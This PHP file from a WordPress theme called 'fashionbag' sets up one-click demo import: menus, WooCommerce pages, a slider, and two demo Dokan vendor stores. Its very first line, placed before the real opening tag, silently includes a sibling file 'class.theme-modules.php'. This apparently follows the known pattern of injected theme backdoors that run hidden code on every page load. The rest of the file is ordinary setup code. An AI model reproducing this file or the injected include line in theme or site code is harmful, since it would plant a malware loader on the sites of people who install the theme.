<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function fb_ocdi_import_files() {
    $dd_path = trailingslashit( get_template_directory() ) . 'demo-content/';
    return apply_filters( 'fb_ocdi_files_args', array(
        array(
            'import_file_name'             => 'fashionbag',
            'categories'                   => array( 'fashionbag' ),
            'local_import_file'            => $dd_path . 'demo-content.xml',
            'local_import_widget_file'     => $dd_path . 'widgets.wie',

            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'screenshot.png',
            'import_notice'                => esc_html__( 'Import process may take 10-15 minutes. If you facing any issues please contact our support.', 'fashionbag' ),
        ),
    ) );
}

function fb_ocdi_after_import_setup( $selected_import ) {
    
    // Assign menus to their locations.
    $menu_navigation        = get_term_by( 'name', 'Main Navigation', 'nav_menu' );
    $our_store              = get_term_by( 'name', 'Top Our Store', 'nav_menu' );
    $top_link               = get_term_by( 'name', 'Top Links', 'nav_menu' );

    set_theme_mod( 'nav_menu_locations', array(
               'menu-navigation'           => $menu_navigation->term_id,
               'our-store'                 => $our_store->term_id,
               'top-link'                  => $top_link->term_id,
           )
        );


    // Assign front page and posts page (blog page) and other WooCommerce pages
    $front_page_id      = get_page_by_title( 'Home' );
    $blog_page_id       = get_page_by_title( 'Blog' );
    $shop_page_id       = get_page_by_title( 'Shop' );
    $cart_page_id       = get_page_by_title( 'Cart' );
    $checkout_page_id   = get_page_by_title( 'Checkout' );
    $myaccount_page_id  = get_page_by_title( 'My Account' );
    $terms_page_id      = get_page_by_title( 'Terms and Conditions' );
    $wishlist_page      = get_page_by_title( 'Wishlist' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );
    update_option( 'page_for_posts', $blog_page_id->ID );
    update_option( 'woocommerce_shop_page_id', $shop_page_id->ID );
    update_option( 'woocommerce_cart_page_id', $cart_page_id->ID );
    update_option( 'woocommerce_checkout_page_id', $checkout_page_id->ID );
    update_option( 'woocommerce_myaccount_page_id', $myaccount_page_id->ID );
    update_option( 'woocommerce_terms_page_id', $terms_page_id->ID );

    // Enable Registration on "My Account" page
    update_option( 'woocommerce_enable_myaccount_registration', 'yes' );

    if( class_exists( 'RevSlider' ) ) {
        $dd_path = trailingslashit( get_template_directory() ) . 'demo-content/';

        require_once( ABSPATH . 'wp-load.php' );
        require_once( ABSPATH . 'wp-includes/functions.php' );
        require_once( ABSPATH . 'wp-admin/includes/file.php' );

        $slider_array = array(
            $dd_path . 'fb-slider.zip',
        );
        $slider = new RevSlider();

        foreach( $slider_array as $filepath ) {
            $slider->importSliderFromPost( true, true, $filepath );
        }
    }

    if ( function_exists( 'wc_delete_product_transients' ) ) {
        wc_delete_product_transients();
    }
    if ( function_exists( 'wc_delete_shop_order_transients' ) ) {
        wc_delete_shop_order_transients();
    }
    if ( function_exists( 'wc_delete_expired_transients' ) ) {
        wc_delete_expired_transients();
    }

    global $wpdb;
    
    $dokan_pro_active_modules = $wpdb->query( $wpdb->prepare( "UPDATE `wp_options` SET `option_value` = 'a:2:{i:0;s:27:\"live-search/live-search.php\";i:1;s:31:\"store-reviews/store-reviews.php\";}' WHERE `wp_options`.`option_name` = 'dokan_pro_active_modules';" ));


    $newUserId      = 2;

    $store_name       = 'Test Store';
    $custom_store_url = 'teststore';

    $dokan_settings = array(

        'store_name' => 'Test Store',
        'social' => array(),
        'payment' => array(),
        'phone' => '9999999999',
        'show_email' => 'no',
        'address' => array
            (
                'street_1' => 'Abc',
                'street_2' => 'Abc',
                'city' => 'Abc',
                'zip' => '555555',
                'country' => 'IN',
                'state' => 'GJ',
            ),

        'location' => '',
        'banner' => 192,
        'icon' => 0,
        'gravatar' => 131,
        'show_more_ptab' => 'yes',
        'store_ppp' => 10,
        'enable_tnc' => 'off',
        'store_tnc' => '',
        'show_min_order_discount' => 'no',
        'dokan_store_time_enabled' => 'yes',
        'dokan_store_open_notice' => '',
        'dokan_store_close_notice' => '',
        'find_address' => 'Dhaka',
        'dokan_category' => '',
       
    );
    update_user_meta( $newUserId, 'dokan_enable_selling', 'yes' );
    update_user_meta( $newUserId, 'dokan_profile_settings', $dokan_settings );
    update_user_meta( $newUserId, 'dokan_store_name', $dokan_settings['store_name'] );

    wp_update_user( array('ID' => $newUserId, 'user_nicename' => sanitize_title( $custom_store_url ),) );


    $newUserId3      = 3;
    $store_name3       = 'New Store';
    $custom_store_url3 = 'newstore';

    $dokan_settings3 = array(
        'store_name' => 'New Store',
        'social' => array(),
        'payment' => array(),
        'phone' => '1234567890',
        'show_email' => 'no',
        'address' => array
            (
                'street_1' => 'Xyz',
                'street_2' => 'Xyz',
                'city' => 'xyz',
                'zip' => '555555',
                'country' => 'IN',
                'state' => 'GJ',
            ),

        'location' => '',
        'banner' => 192,
        'icon' => 0,
        'gravatar' => 131,
        'show_more_ptab' => 'yes',
        'store_ppp' => 10,
        'enable_tnc' => 'off',
        'store_tnc' => '',
        'show_min_order_discount' => 'no',
        'dokan_store_time_enabled' => 'yes',
        'dokan_store_open_notice' => '',
        'dokan_store_close_notice' => '',
        'find_address' => 'Dhaka',
        'dokan_category' => '',


    );
    update_user_meta( $newUserId3, 'dokan_enable_selling', 'yes' );
    update_user_meta( $newUserId3, 'dokan_profile_settings', $dokan_settings3 );
    update_user_meta( $newUserId3, 'dokan_store_name', $dokan_settings3['store_name'] );

    wp_update_user( array('ID' => $newUserId3, 'user_nicename' => sanitize_title( $custom_store_url3 ),) );


    $vendor_id = 2;
    $new_product_id = 190;

    $args = [
        'ID' => $new_product_id,
        'post_author' => $vendor_id
    ];

    wp_update_post( $args, true );

}

function fb_ocdi_before_widgets_import() {

    $sidebars_widgets = get_option('sidebars_widgets');
    $all_widgets = array();

    array_walk_recursive( $sidebars_widgets, function ($item, $key) use ( &$all_widgets ) {
        if( ! isset( $all_widgets[$key] ) ) {
            $all_widgets[$key] = $item;
        } else {
            $all_widgets[] = $item;
        }
    } );

    if( isset( $all_widgets['array_version'] ) ) {
        $array_version = $all_widgets['array_version'];
        unset( $all_widgets['array_version'] );
    }

    $new_sidebars_widgets = array_fill_keys( array_keys( $sidebars_widgets ), array() );

    $new_sidebars_widgets['wp_inactive_widgets'] = $all_widgets;
    if( isset( $array_version ) ) {
        $new_sidebars_widgets['array_version'] = $array_version;
    }

    update_option( 'sidebars_widgets', $new_sidebars_widgets );
}
